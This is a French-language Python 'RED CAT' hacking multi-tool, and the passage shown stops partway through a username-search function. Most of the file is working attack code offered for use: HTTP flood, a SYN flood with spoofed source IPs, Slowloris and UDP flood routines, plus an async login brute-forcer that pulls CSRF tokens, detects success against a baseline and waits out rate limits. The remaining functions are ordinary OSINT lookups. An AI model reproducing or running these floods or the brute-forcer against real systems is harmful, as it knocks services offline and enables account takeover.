#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, os, time, re, json, string, signal, ssl, random as _rnd_mod, hashlib, asyncio
import http.client, urllib.parse, subprocess
import socket as sock_lib
from random import randrange, choice, random, randint
from socket import socket, AF_INET, SOCK_STREAM, SOCK_RAW, SOCK_DGRAM, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname, inet_aton
from struct import pack
from threading import Thread, Lock
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import urlparse

try:
    import aiohttp
    from termcolor import colored, cprint
    from bs4 import BeautifulSoup
    from tqdm.asyncio import tqdm as tqdm_asyncio
    from tqdm import tqdm
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
except ImportError as e:
    print(f"\033[91m[!] Module manquant : {e}\033[0m")
    print("\033[93m[!] python -m pip install aiohttp beautifulsoup4 tqdm colorama termcolor requests shodan phonenumbers vt-py exifread yt-dlp ipinfo mac-vendor-lookup dnspython opencv-python pillow\033[0m")
    sys.exit(1)

if os.name == 'nt':
    import colorama
    colorama.init()

try:
    signal.signal(signal.SIGFPE, signal.SIG_DFL)
except (AttributeError, ValueError):
    pass

VERSION = '3.3'

class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; WHITE = "\033[97m"
    BLOOD = "\033[38;5;88m"; BLOOD_LIGHT = "\033[38;5;124m"

def info(m): print(f"  {C.BLUE}[*]{C.RESET} {m}")
def ok(m): print(f"  {C.GREEN}[+]{C.RESET} {m}")
def warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def err(m): print(f"  {C.RED}[x]{C.RESET} {m}")
def dim(m): print(f"  {C.DIM}{m}{C.RESET}")
def blood(m): print(f"  {C.BLOOD}{m}{C.RESET}")

def show_banner():
    print(f"""{C.RED}
░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
{C.BLOOD_LIGHT}                    v{VERSION} - Sang pour Sang{C.RED}
     {C.BLOOD}DDoS + BruteForce + OSINT + Utilitaires{C.RED}
{C.RESET}""")
    print()

def show_menu():
    print(f"""
{C.BLOOD}===============================================================
                     RED CAT - MENU PRINCIPAL
===============================================================
  {C.RED}[{C.WHITE}01{C.RED}]{C.WHITE} DDoS - Request (HTTP Flood)                     {C.BLOOD}
  {C.RED}[{C.WHITE}02{C.RED}]{C.WHITE} DDoS - Synflood (root)                         {C.BLOOD}
  {C.RED}[{C.WHITE}03{C.RED}]{C.WHITE} DDoS - Pyslow (Slowloris)                     {C.BLOOD}
  {C.RED}[{C.WHITE}04{C.RED}]{C.WHITE} DDoS - UDP Flood                              {C.BLOOD}
  {C.RED}[{C.WHITE}05{C.RED}]{C.WHITE} BruteForce - Formulaire HTML                  {C.BLOOD}
  {C.RED}[{C.WHITE}06{C.RED}]{C.WHITE} BruteForce - API JSON                         {C.BLOOD}
  {C.RED}[{C.WHITE}07{C.RED}]{C.WHITE} OSINT - Shodan                                {C.BLOOD}
  {C.RED}[{C.WHITE}08{C.RED}]{C.WHITE} OSINT - WiGLE WiFi                            {C.BLOOD}
  {C.RED}[{C.WHITE}09{C.RED}]{C.WHITE} OSINT - Numero de telephone                  {C.BLOOD}
  {C.RED}[{C.WHITE}10{C.RED}]{C.WHITE} OSINT - VirusTotal                            {C.BLOOD}
  {C.RED}[{C.WHITE}11{C.RED}]{C.WHITE} OSINT - Geolocalisation                      {C.BLOOD}
  {C.RED}[{C.WHITE}12{C.RED}]{C.WHITE} OSINT - MAC Address                           {C.BLOOD}
  {C.RED}[{C.WHITE}13{C.RED}]{C.WHITE} OSINT - EXIF Data                             {C.BLOOD}
  {C.RED}[{C.WHITE}14{C.RED}]{C.WHITE} OSINT - YouTube Downloader                    {C.BLOOD}
  {C.RED}[{C.WHITE}15{C.RED}]{C.WHITE} OSINT - Crypto Trace                          {C.BLOOD}
  {C.RED}[{C.WHITE}16{C.RED}]{C.WHITE} OSINT - Sherlock                              {C.BLOOD}
  {C.RED}[{C.WHITE}17{C.RED}]{C.WHITE} OSINT - SearchFace                            {C.BLOOD}
  {C.RED}[{C.WHITE}18{C.RED}]{C.WHITE} Port Scanner                                  {C.BLOOD}
  {C.RED}[{C.WHITE}19{C.RED}]{C.WHITE} Subdomain Finder                              {C.BLOOD}
  {C.RED}[{C.WHITE}20{C.RED}]{C.WHITE} DNS Lookup                                    {C.BLOOD}
  {C.RED}[{C.WHITE}21{C.RED}]{C.WHITE} Whois Lookup                                  {C.BLOOD}
  {C.RED}[{C.WHITE}22{C.RED}]{C.WHITE} Password Generator                            {C.BLOOD}
  {C.RED}[{C.WHITE}23{C.RED}]{C.WHITE} Hash Generator                                {C.BLOOD}
  {C.RED}[{C.WHITE}24{C.RED}]{C.WHITE} IP Tracker                                    {C.BLOOD}
  {C.RED}[{C.WHITE}25{C.RED}]{C.WHITE} MC IP Finder                                  {C.BLOOD}
  {C.RED}[{C.WHITE}26{C.RED}]{C.WHITE} Find Domain IP                                {C.BLOOD}
  {C.RED}[{C.WHITE}99{C.RED}]{C.WHITE} Quitter                                       {C.BLOOD}
===============================================================
{C.RESET}""")

def _extract_host(target):
    if '://' in target:
        parsed = urlparse(target)
        return parsed.hostname or target
    if ':' in target and not target.count(':') > 1:
        return target.split(':')[0]
    return target

def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for _ in range(4)]
        if ips[0] != "127":
            return '.'.join(ips)

def check_tgt(tgt):
    host = _extract_host(tgt)
    try:
        return gethostbyname(host)
    except Exception:
        err(f"Resolution echouee: {host}")
        return None

def add_useragent():
    try:
        with open("./ua.txt", "r") as fp:
            ua = re.findall(r"(.+)\n", fp.read())
            if ua:
                return ua
    except Exception:
        pass
    return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"]

def add_bots():
    return ['http://www.bing.com/search?q=%40&count=50&first=0',
            'http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8']

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt, self.port, self.to = tgt, port, to
        self.threads, self.sleep = threads, sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0
    def mypkt(self):
        data = (choice(self.method) + ' /' + str(randrange(1, 999999999)) + ' HTTP/1.1\r\n' +
                'Host:' + self.tgt + '\r\n' + 'User-Agent:' + choice(add_useragent()) + '\r\n' +
                'Content-Length: 42\r\n')
        return data.encode('utf-8')
    def building_socket(self):
        try:
            s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            s.settimeout(self.to)
            s.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            s.sendto(self.mypkt(), (self.tgt, int(self.port)))
            self.pkt_count += 1
            return s
        except Exception:
            return None
    def sending_packets(self):
        try:
            s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            s.settimeout(self.to)
            s.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            s.sendall(b'X-a: b\r\n')
            self.pkt_count += 1
            return s
        except Exception:
            return None
    def doconnection(self):
        socks = 0
        while socks < int(self.threads):
            if self.building_socket():
                socks += 1
        while socks < int(self.threads):
            if self.sending_packets():
                socks += 1
        blood(f"Pyslow: {self.pkt_count} paquets envoyes")
        time.sleep(self.sleep)

class Requester(Thread):
    req_count = 0
    lock = Lock()
    def __init__(self, tgt):
        Thread.__init__(self)
        self.raw = tgt
        parsed = urlparse(tgt) if '://' in tgt else None
        if parsed and parsed.hostname:
            self.ssl = parsed.scheme == 'https'
            self.port = parsed.port or (443 if self.ssl else 80)
            self.tgt = parsed.hostname
        else:
            host = _extract_host(tgt)
            self.tgt = host
            self.ssl = False
            self.port = 80
        self.conn = None
    def header(self):
        return {'User-Agent': choice(add_useragent()),
                'Cache-Control': choice(['no-cache', 'no-store', f'max-age={randrange(0,10)}']),
                'Accept-Encoding': choice(['gzip', 'compress', '*']),
                'Keep-Alive': '42', 'Host': self.tgt, 'Referer': choice(add_bots())}
    def run(self):
        try:
            self.conn = (http.client.HTTPSConnection if self.ssl else http.client.HTTPConnection)(self.tgt, self.port, timeout=10)
            self.conn.request(choice(['GET', 'POST']).upper(),
                f"/?{''.join(choice(string.ascii_letters) for _ in range(randrange(7,14)))}&{''.join(choice(string.ascii_letters) for _ in range(randrange(7,14)))}",
                None, self.header())
            with self.lock:
                Requester.req_count += 1
                cnt = Requester.req_count
            if cnt % 100 == 0:
                blood(f"Requester: {cnt} requetes")
        except Exception:
            pass
        finally:
            if self.conn:
                try: self.conn.close()
                except Exception: pass

class Synflood(Thread):
    def __init__(self, tgt, ip):
        Thread.__init__(self)
        self.tgt, self.ip = tgt, ip
        try:
            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        except Exception:
            self.sock = None
        self.lock = Lock()
        self.psh = b''
    def checksum(self):
        psh = self.psh if len(self.psh) % 2 == 0 else self.psh + b'\x00'
        s = 0
        for i in range(0, len(psh), 2):
            s += (psh[i] << 8) + psh[i+1]
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff
    def run(self):
        if not self.sock:
            return
        try:
            src_ip = inet_aton(self.ip)
            dst_ip = inet_aton(self.tgt)
            ip_header = pack('!BBHHHBBH4s4s',
                             (4 << 4) + 5, 0, 40, 54321, 0, 64, IPPROTO_TCP, 0,
                             src_ip, dst_ip)
            tcp_header = pack('!HHLLBBHHH', 54321, 80, 0, 0, (5 << 4), 2, 5840, 0, 0)
            self.psh = pack('!4s4sBBH', src_ip, dst_ip, 0, IPPROTO_TCP, len(tcp_header)) + tcp_header
            csum = self.checksum()
            tcp_header = pack('!HHLLBBHHH', 54321, 80, 0, 0, (5 << 4), 2, 5840, csum, 0)
            self.sock.sendto(ip_header + tcp_header, (self.tgt, 0))
        except Exception:
            pass

def run_ddos(target, attack_type='Request', threads=1000, port=80, timeout=5.0, sleep=100, spoof_ip=None):
    blood(f"\n=== DDoS Attack -- {attack_type} ===")
    ip = check_tgt(target)
    if not ip: return
    host = _extract_host(target)
    blood(f"Target: {host} -> {ip}")
    blood(f"Threads: {threads}")
    blood("====================================\n")
    if attack_type == 'Synflood':
        try: is_root = os.geteuid() == 0
        except AttributeError: is_root = False
        if not is_root:
            err("Synflood necessite root")
            return
        while True:
            try:
                for _ in range(int(threads)):
                    Synflood(ip, spoof_ip or fake_ip()).start()
            except KeyboardInterrupt:
                err("\nArrete")
                break
    elif attack_type == 'Request':
        while True:
            try:
                for _ in range(int(threads)):
                    Requester(host).start()
            except KeyboardInterrupt:
                err("\nArrete")
                break
    elif attack_type == 'Pyslow':
        while True:
            try:
                Pyslow(host, port, float(timeout), int(threads), int(sleep)).doconnection()
            except KeyboardInterrupt:
                err("\nArrete")
                break

udp_running = False
udp_threads = []

def udp_flood_attack(target_ip, target_port, threads_count=1500):
    global udp_running, udp_threads
    payloads = [b"GET / HTTP/1.1\r\n", b"POST / HTTP/1.1\r\n", b"HEAD / HTTP/1.1\r\n"]
    def attack():
        while udp_running:
            try:
                s = socket(AF_INET, SOCK_DGRAM)
                data = choice(payloads) + os.urandom(randint(10, 100))
                s.sendto(data, (target_ip, target_port))
                s.close()
            except Exception:
                pass
    udp_running = True
    blood(f"UDP Flood sur {target_ip}:{target_port} ({threads_count} threads)")
    for i in range(int(threads_count)):
        t = Thread(target=attack)
        t.daemon = True
        t.start()
        udp_threads.append(t)

def stop_udp_flood():
    global udp_running, udp_threads
    udp_running = False
    udp_threads = []
    ok("UDP Flood arrete")

def udp_flood():
    print(f"\n  {C.BLOOD}UDP FLOOD{C.RESET}")
    target = input(f"  {C.BLOOD}IP cible: {C.RESET}")
    try:
        port = int(input(f"  {C.BLOOD}Port: {C.RESET}"))
    except ValueError:
        err("Port invalide"); return
    try:
        threads = int(input(f"  {C.BLOOD}Threads (1500): {C.RESET}") or "1500")
    except ValueError:
        threads = 1500
    host = _extract_host(target)
    try:
        ip = gethostbyname(host)
    except Exception:
        ip = host
    blood(f"Lancement sur {ip}:{port}...")
    try:
        udp_flood_attack(ip, port, threads)
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_udp_flood()

CSRF_RE = re.compile(r"csrf[-_]?token|_csrf|csrfmiddlewaretoken|_token|authenticity_token|__RequestVerificationToken|XSRF[-_]TOKEN", re.IGNORECASE)
PASSWORD_INPUT_RE = re.compile(r'<input[^>]+type=["\']password["\']', re.IGNORECASE)
JS_TOKEN_RES = [re.compile(r'(?:var|let|const)\s+csrf[_\-]?[tT]oken\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
                re.compile(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE)]
TWO_FA_RE = re.compile(r"\b(otp|2fa|two[\- ]?factor|mfa|totp|verification[\- ]?code)\b", re.IGNORECASE)
LOCKOUT_RE = re.compile(r"\b(too many (failed|attempts)|account (locked|suspended)|rate[\- ]?limit)\b", re.IGNORECASE)

@dataclass
class Config:
    url: str; username: str; error_message: str; password_file: str
    username_field: str = "email"; password_field: str = "password"
    login_mode: str = "form"; api_endpoint: Optional[str] = None
    workers: int = 10; delay: float = 0.0; jitter: float = 0.0
    timeout: float = 15.0; max_retries: int = 3
    proxy: Optional[str] = None; verify_tls: bool = True
    output: Optional[str] = None; csrf_token_name: Optional[str] = None
    user_agents: list = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"])

@dataclass
class Baseline:
    status: int; body_len: int; body_hash: str; final_url: str
    redirected: bool; set_cookie_keys: tuple
    @classmethod
    def from_response(cls, status, body, final_url, initial_url, set_cookie_keys):
        return cls(status=status, body_len=len(body),
                   body_hash=hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest(),
                   final_url=final_url.split("?")[0].rstrip("/"),
                   redirected=initial_url.split("?")[0].rstrip("/") != final_url.split("?")[0].rstrip("/"),
                   set_cookie_keys=set_cookie_keys)

@dataclass
class AttemptResult:
    success: bool; password: str; reason: Optional[str] = None
    needs_2fa: bool = False; locked_out: bool = False

class CSRFCache:
    def __init__(self, login_url, session, headers, known_name=None):
        self.login_url = login_url; self.session = session
        self.headers = headers; self.known_name = known_name
        self.name = None; self.value = None
        self._lock = asyncio.Lock(); self._fetched_once = False
    async def get(self, force=False):
        async with self._lock:
            if force or not self._fetched_once or self.value is None:
                await self._fetch()
            return self.name, self.value
    async def invalidate(self):
        async with self._lock:
            self.value = None
    async def _fetch(self):
        try:
            async with self.session.get(self.login_url, headers=self.headers, allow_redirects=True) as r:
                html = await r.text()
        except Exception:
            self._fetched_once = True; return
        soup = BeautifulSoup(html, "html.parser")
        for tag in soup.find_all("input"):
            name = tag.get("name", "") or ""
            if CSRF_RE.search(name):
                value = tag.get("value", "") or ""
                if value:
                    self.name, self.value = name, value
                    self._fetched_once = True; return
        for meta in soup.find_all("meta"):
            name = meta.get("name", "") or ""
            if CSRF_RE.search(name):
                content = meta.get("content", "") or ""
                if content:
                    self.name, self.value = name, content
                    self._fetched_once = True; return
        for cookie in self.session.cookie_jar:
            if CSRF_RE.search(cookie.key):
                self.name, self.value = cookie.key, cookie.value
                self._fetched_once = True; return
        for pat in JS_TOKEN_RES:
            m = pat.search(html)
            if m:
                self.name, self.value = self.known_name or "csrf_token", m.group(1)
                self._fetched_once = True; return
        self._fetched_once = True

class Cracker:
    def __init__(self, cfg):
        self.cfg = cfg
        self.session = None; self.csrf = None; self.baseline = None
        self.cancel = asyncio.Event()
        self.pause = asyncio.Event(); self.pause.set()
        self._consecutive_lockout_hits = 0
        self._lockout_threshold = 3
    async def __aenter__(self):
        ssl_ctx = True
        if not self.cfg.verify_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False; ssl_ctx.verify_mode = ssl.CERT_NONE
        connector = TCPConnector(limit=self.cfg.workers*2, limit_per_host=self.cfg.workers,
                                 ssl=ssl_ctx if isinstance(ssl_ctx, ssl.SSLContext) else None, ttl_dns_cache=300)
        self.session = ClientSession(connector=connector, timeout=ClientTimeout(total=self.cfg.timeout),
                                     trust_env=True, headers={"Accept":"text/html,*/*;q=0.8","Accept-Language":"en-US,en;q=0.5"})
        self.csrf = CSRFCache(self.cfg.url, self.session, self._base_headers(), self.cfg.csrf_token_name)
        return self
    async def __aexit__(self, *exc):
        if self.session: await self.session.close()
    def _base_headers(self):
        return {"User-Agent": choice(self.cfg.user_agents), "Referer": self.cfg.url,
                "Origin": f"{urlparse(self.cfg.url).scheme}://{urlparse(self.cfg.url).netloc}"}
    def _build_payload(self, password):
        return {self.cfg.username_field: self.cfg.username, self.cfg.password_field: password}
    async def _post(self, password):
        token_name, token_value = await self.csrf.get()
        headers = self._base_headers()
        is_json = self.cfg.login_mode == "json"
        endpoint = self.cfg.api_endpoint if is_json else self.cfg.url
        if is_json:
            headers["Content-Type"] = "application/json"; headers["Accept"] = "application/json"
            if token_value:
                headers["X-CSRFToken"] = token_value; headers["X-XSRF-TOKEN"] = token_value
            kw = {"json": self._build_payload(password), "headers": headers}
        else:
            payload = self._build_payload(password)
            if token_name and token_value: payload[token_name] = token_value
            kw = {"data": payload, "headers": headers}
        if self.cfg.proxy: kw["proxy"] = self.cfg.proxy
        backoff = 1.0
        for attempt in range(self.cfg.max_retries):
            await self.pause.wait()
            if self.cancel.is_set(): return None
            try:
                async with self.session.post(endpoint, allow_redirects=True, **kw) as r:
                    body = await r.text()
                    if r.status == 429:
                        retry_after = float(r.headers.get("Retry-After", "5") or 5)
                        await self._engage_pause(retry_after, f"429, pause {retry_after:.1f}s")
                        continue
                    if r.status in (419, 440):
                        await self.csrf.invalidate(); await asyncio.sleep(backoff); backoff *= 2; continue
                    if r.status >= 500:
                        await asyncio.sleep(backoff + random()*0.5); backoff *= 2; continue
                    set_cookies = tuple(sorted({c.key for c in self.session.cookie_jar}))
                    return r.status, body, str(r.url), set_cookies
            except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
                    asyncio.TimeoutError, aiohttp.ClientOSError, aiohttp.ClientPayloadError,
                    aiohttp.ClientConnectionError, aiohttp.ServerTimeoutError):
                await asyncio.sleep(backoff + random()*0.5); backoff *= 2; continue
            except Exception:
                return None
        return None
    async def _engage_pause(self, seconds, reason):
        if self.pause.is_set():
            self.pause.clear()
            try:
                warn(reason); await asyncio.sleep(seconds)
            finally: self.pause.set()
    def _check(self, status, body, final_url, cookie_keys):
        if self.baseline is None:
            return False, None, False, False
        b = self.baseline
        body_lower = body.lower()
        if LOCKOUT_RE.search(body_lower): return False, None, False, True
        if self.cfg.error_message and self.cfg.error_message.lower() in body_lower:
            return False, None, False, False
        success_json = False; json_reason = None
        if "application/json" in body_lower[:200] or body.lstrip().startswith(("{", "[")):
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    for key in ("token", "access_token", "jwt", "id_token"):
                        v = data.get(key)
                        if isinstance(v, str) and len(v) > 10:
                            success_json = True; json_reason = f"token '{key}'"; break
                    if not success_json:
                        for key in ("error","message","msg","detail","errors","code"):
                            ev = str(data.get(key, "")).lower()
                            if ev and any(x in ev for x in ("invalid","incorrect","wrong","failed","unauthorized")):
                                return False, None, False, False
            except Exception:
                pass
        body_h = hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest()
        size_delta = abs(len(body) - b.body_len); size_ratio = size_delta / max(b.body_len, 1)
        diffs = []
        if status != b.status: diffs.append(f"status {b.status}->{status}")
        new_final = final_url.split("?")[0].rstrip("/")
        if new_final != b.final_url: diffs.append("URL finale changee")
        if body_h != b.body_hash and size_ratio > 0.05: diffs.append(f"body diff {size_ratio*100:.1f}%")
        new_cookies = set(cookie_keys) - set(b.set_cookie_keys)
        if new_cookies: diffs.append(f"cookies: {','.join(sorted(new_cookies))}")
        if not diffs and not success_json: return False, None, False, False
        if TWO_FA_RE.search(body_lower): return True, "2FA", True, False
        if not success_json and PASSWORD_INPUT_RE.search(body) and new_final == b.final_url:
            return False, None, False, False
        if success_json: return True, json_reason, False, False
        return True, "; ".join(diffs), False, False
    async def attempt(self, password):
        if self.cfg.delay or self.cfg.jitter:
            await asyncio.sleep(self.cfg.delay + random()*self.cfg.jitter)
        result = await self._post(password)
        if result is None: return AttemptResult(False, password)
        status, body, final_url, cookie_keys = result
        success, reason, needs_2fa, locked = self._check(status, body, final_url, cookie_keys)
        if locked:
            self._consecutive_lockout_hits += 1
            if self._consecutive_lockout_hits >= self._lockout_threshold: self.cancel.set()
            return AttemptResult(False, password, locked_out=True)
        self._consecutive_lockout_hits = 0
        return AttemptResult(success, password, reason, needs_2fa)
    async def calibrate(self):
        blood("Calibration...")
        t1 = hashlib.sha256(str(random()).encode()).hexdigest()[:24]
        t2 = hashlib.sha256(str(random()).encode()).hexdigest()[:24]
        await self.csrf.get(force=True)
        r1 = await self._post(t1)
        if r1 is None: err("Cible injoignable"); return False
        s1, b1, u1, c1 = r1
        self.baseline = Baseline.from_response(s1, b1, u1, self.cfg.url, c1)
        await self._post(t2)
        return True

async def run_bruteforce(cfg):
    blood(f"\n=== BruteForce ===")
    blood(f"{cfg.url} | {cfg.username} | {cfg.workers} workers")
    blood("==================\n")
    passwords = []
    try:
        with open(cfg.password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception:
        err(f"Impossible d'ouvrir {cfg.password_file}"); return
    if not passwords:
        err("Fichier de mots de passe vide"); return
    blood(f"Charge {len(passwords)} mots de passe")
    async with Cracker(cfg) as cracker:
        if not await cracker.calibrate(): return
        sem = asyncio.Semaphore(cfg.workers)
        found = None; checked = 0
        async def worker(pwd):
            nonlocal found, checked
            if found: return
            async with sem:
                result = await cracker.attempt(pwd)
                checked += 1
                if checked % 100 == 0: blood(f"Testes: {checked}/{len(passwords)}")
                if result.success:
                    found = pwd
                    ok(f"\nPASSWORD TROUVE: {pwd}")
                    if result.reason: dim(f"  -> {result.reason}")
                    if result.needs_2fa: warn("  -> 2FA !")
                if result.locked_out: warn("  -> Verrouille !")
        await asyncio.gather(*[asyncio.create_task(worker(p)) for p in passwords])
        if not found: warn("Aucun mot de passe trouve")
        elif cfg.output:
            try:
                with open(cfg.output, 'w', encoding='utf-8') as f:
                    f.write(f"{cfg.username}:{found}\n")
                ok(f"Sauvegarde dans {cfg.output}")
            except Exception as e:
                err(f"Sauvegarde impossible: {e}")

def shodan():
    try: import shodan as shodan_lib
    except ImportError: err("pip install shodan"); return
    api_key = input(f"  {C.BLOOD}Cle API: {C.RESET}")
    if not api_key: err("Cle requise"); return
    target = input(f"  {C.BLOOD}IP/domaine: {C.RESET}")
    try:
        api = shodan_lib.Shodan(api_key)
        info = api.host(_extract_host(target))
        print(f"\n  {C.GREEN}[+]{C.RESET} IP: {info.get('ip_str', 'N/A')}")
        print(f"  {C.GREEN}[+]{C.RESET} Org: {info.get('org', 'N/A')}")
        print(f"  {C.GREEN}[+]{C.RESET} OS: {info.get('os', 'N/A')}")
        print(f"  {C.GREEN}[+]{C.RESET} Pays: {info.get('country_name', 'N/A')}")
        print(f"  {C.GREEN}[+]{C.RESET} Ports: {info.get('ports', [])}")
    except Exception as e: err(f"Erreur: {e}")

def wigle():
    warn("WiGLE - cle API sur https://wigle.net")

def numlook():
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
    except ImportError: err("pip install phonenumbers"); return
    numero = input(f"  {C.BLOOD}Numero: {C.RESET}")
    try:
        phone = phonenumbers.parse(numero)
        if phonenumbers.is_valid_number(phone):
            print(f"\n  {C.GREEN}[+]{C.RESET} Valide")
            print(f"  {C.GREEN}[+]{C.RESET} Pays: {geocoder.description_for_number(phone, 'fr')}")
            print(f"  {C.GREEN}[+]{C.RESET} Operateur: {carrier.name_for_number(phone, 'fr')}")
            print(f"  {C.GREEN}[+]{C.RESET} Fuseau: {timezone.time_zones_for_number(phone)}")
        else: err("Invalide")
    except Exception: err("Format invalide")

def vt():
    try: import vt
    except ImportError: err("pip install vt-py"); return
    api_key = input(f"  {C.BLOOD}Cle API: {C.RESET}")
    if not api_key: err("Cle requise"); return
    target = input(f"  {C.BLOOD}IP/URL/Hash: {C.RESET}")
    try:
        client = vt.Client(api_key)
        if re.match(r'^[a-fA-F0-9]{32,64}$', target):
            a = client.get_object(f"/files/{target}")
            print(f"\n  {C.GREEN}[+]{C.RESET} Hash: {a.md5}")
            print(f"  {C.GREEN}[+]{C.RESET} Detections: {a.last_analysis_stats}")
        else:
            a = client.get_object(f"/urls/{target}")
            print(f"\n  {C.GREEN}[+]{C.RESET} URL: {a.url}")
            print(f"  {C.GREEN}[+]{C.RESET} Detections: {a.last_analysis_stats}")
        client.close()
    except Exception as e: err(f"Erreur: {e}")

def geolock():
    try: import requests as req
    except ImportError: err("pip install requests"); return
    target = input(f"  {C.BLOOD}IP: {C.RESET}")
    try:
        resp = req.get(f"http://ip-api.com/json/{target}", timeout=10)
        data = resp.json()
        if data.get('status') == 'success':
            print(f"\n  {C.GREEN}[+]{C.RESET} IP: {data.get('query', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Pays: {data.get('country', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Region: {data.get('regionName', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Ville: {data.get('city', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Lat/Lon: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} FAI: {data.get('isp', 'N/A')}")
        else: err("Non trouvee")
    except Exception as e: err(f"Erreur: {e}")

def mactrace():
    try: from mac_vendor_lookup import MacLookup
    except ImportError: err("pip install mac-vendor-lookup"); return
    mac = input(f"  {C.BLOOD}MAC: {C.RESET}")
    try:
        v = MacLookup().lookup(mac)
        print(f"\n  {C.GREEN}[+]{C.RESET} MAC: {mac}")
        print(f"  {C.GREEN}[+]{C.RESET} Fabricant: {v}")
    except Exception as e: err(f"Erreur: {e}")

def exif():
    try: import exifread
    except ImportError: err("pip install exifread"); return
    chemin = input(f"  {C.BLOOD}Chemin: {C.RESET}").strip('"\'')
    try:
        with open(chemin, 'rb') as f:
            tags = exifread.process_file(f)
            if tags:
                print(f"\n  {C.GREEN}[+]{C.RESET} EXIF:")
                for tag, value in list(tags.items())[:20]: print(f"    {tag}: {value}")
            else: warn("Aucune donnee")
    except Exception as e: err(f"Erreur: {e}")

def ytd():
    try: import yt_dlp
    except ImportError: err("pip install yt-dlp"); return
    url = input(f"  {C.BLOOD}URL: {C.RESET}")
    outtmpl = os.path.join(os.path.expanduser("~"), "%(title)s.%(ext)s")
    try:
        ydl_opts = {'format': 'bestaudio/best', 'outtmpl': outtmpl, 'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            print(f"\n  {C.GREEN}[+]{C.RESET} Titre: {info.get('title', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Duree: {info.get('duration', 'N/A')}s")
            dl = input(f"  {C.YELLOW}Telecharger ? (o/N): {C.RESET}").lower()
            if dl == 'o':
                ydl_opts['download'] = True
                with yt_dlp.YoutubeDL(ydl_opts) as ydl2: ydl2.download([url])
                ok("Termine")
    except Exception as e: err(f"Erreur: {e}")

def cryptotrace():
    try: import requests as req
    except ImportError: err("pip install requests"); return
    wallet = input(f"  {C.BLOOD}Adresse BTC: {C.RESET}")
    try:
        resp = req.get(f"https://blockchain.info/balance?active={wallet}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if wallet in data:
                print(f"\n  {C.GREEN}[+]{C.RESET} Wallet: {wallet}")
                print(f"  {C.GREEN}[+]{C.RESET} Solde BTC: {data[wallet]['final_balance'] / 1e8}")
    except Exception as e: err(f"Erreur: {e}")

def sherlock():
    try: import requests as req
    except ImportError: err("pip install requests"); return
    username = input(f"  {C.BLOOD}Username: {C.RESET}")
    sites = ["https://github.com/", "https://twitter.com/", "https://www.instagram.com/",
             "https://www.facebook.com/", "https://www.reddit.com/user/", "https://tiktok.com/@",
             "https://youtube.com/@", "https://www.tumblr.com/", "https://medium.com/@",
